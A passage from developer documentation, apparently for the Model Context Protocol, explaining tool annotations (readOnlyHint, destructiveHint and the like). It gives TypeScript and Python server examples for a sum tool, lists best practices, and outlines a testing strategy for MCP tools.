description: \"Create a new record in the database\",\n  inputSchema: {\n    type: \"object\",\n    properties: {\n      table: { type: \"string\" },\n      data: { type: \"object\" }\n    },\n    required: [\"table\", \"data\"]\n  },\n  annotations: {\n    title: \"Create Database Record\",\n    readOnlyHint: false,\n    destructiveHint: false,\n    idempotentHint: false,\n    openWorldHint: false\n  }\n}\n```\n\n### Integrating annotations in server implementation\n\n<CodeGroup>\n\n```typescript TypeScript\nserver.setRequestHandler(ListToolsRequestSchema, async () => {\n  return {\n    tools: [\n      {\n        name: \"calculate_sum\",\n        title: \"Calculate Sum\",\n        description: \"Add two numbers together\",\n        inputSchema: {\n          type: \"object\",\n          properties: {\n            a: { type: \"number\" },\n            b: { type: \"number\" },\n          },\n          required: [\"a\", \"b\"],\n        },\n        annotations: {\n          title: \"Calculate Sum\",\n          readOnlyHint: true,\n          openWorldHint: false,\n        },\n      },\n    ],\n  };\n});\n```\n\n```python Python\nfrom mcp.server.fastmcp import FastMCP\n\nmcp = FastMCP(\"example-server\")\n\n@mcp.tool(\n    annotations={\n        \"title\": \"Calculate Sum\",\n        \"readOnlyHint\": True,\n        \"openWorldHint\": False\n    }\n)\nasync def calculate_sum(a: float, b: float) -> str:\n    \"\"\"Add two numbers together.\n\n    Args:\n        a: First number to add\n        b: Second number to add\n    \"\"\"\n    result = a + b\n    return str(result)\n```\n\n</CodeGroup>\n\n### Best practices for tool annotations\n\n1. **Be accurate about side effects**: Clearly indicate whether a tool modifies its environment and whether those modifications are destructive.\n\n2. **Use descriptive titles**: Provide human-friendly titles that clearly describe the tool's purpose.\n\n3. **Indicate idempotency properly**: Mark tools as idempotent only if repeated calls with the same arguments truly have no additional effect.\n\n4. **Set appropriate open/closed world hints**: Indicate whether a tool interacts with a closed system (like a database) or an open system (like the web).\n\n5. **Remember annotations are hints**: All properties in ToolAnnotations are hints and not guaranteed to provide a faithful description of tool behavior. Clients should never make security-critical decisions based solely on annotations.\n\n## Testing tools\n\nA comprehensive testing strategy for MCP tools should cover:\n\n- **Functional testing**: Verify tools execute correctly with valid inputs and handle invalid inputs appropriately\n- **Integration testing**: Test tool interaction with external systems using both real and mocked dependencies\n- **Security testing**: Validate authentication, authorization, input sanitization, and rate limiting\n- **Performance testing**: Check behavior under load, timeout handling, and resource cleanup\n- **Error handling**: Ensure tools properly report errors through the MCP protocol and clean up resources\n"}
